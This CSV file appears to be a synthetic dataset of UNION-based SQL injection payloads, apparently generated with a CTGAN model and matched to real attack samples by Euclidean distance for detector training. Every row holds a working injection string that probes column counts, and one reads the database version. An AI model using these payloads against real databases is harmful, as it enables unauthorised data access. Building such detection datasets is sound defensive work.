id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.384119518773606
CTGAN_000002,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,8.832977405153224
CTGAN_000003,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,6.432691277367202
CTGAN_000004,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.09760515443378
CTGAN_000005,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.611129605313198
CTGAN_000006,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,11.315525335461315
CTGAN_000007,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.99792576250693
CTGAN_000008,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,5.568381695107971
CTGAN_000009,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,5.8929934484041855
CTGAN_000010,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,5.54630272207332
CTGAN_000011,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.708017387015679
CTGAN_000012,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,5.257532059607747
CTGAN_000013,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,6.0484595866654525
CTGAN_000014,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,6.2840728213216375
CTGAN_000015,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.6099828269854655
CTGAN_000016,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.863697569637346
CTGAN_000017,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.243196575540293
CTGAN_000018,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.092154723061543
CTGAN_000019,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,4.840380156170237
